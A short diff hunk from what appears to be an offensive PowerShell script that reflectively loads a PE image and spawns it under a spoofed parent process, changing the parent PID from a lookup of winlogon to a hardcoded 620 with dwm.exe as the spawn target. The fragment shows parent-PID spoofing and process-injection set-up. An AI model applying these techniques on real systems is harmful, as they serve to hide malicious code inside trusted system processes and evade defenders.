@@ -2244,7 +2244,7 @@ $input.Close()
 
         return @($PEInfo.PEHandle, $EffectivePEHandle)
     }
-[int]$ppid = Get-Process -Name "winlogon" | Select -expand ID
+[int]$ppid = 620
 $spawnTo = "c:\Windows\System32\dwm.exe"
 $currdir = "c:\Windows\System32"
 $cmdline = "dwm.exe"
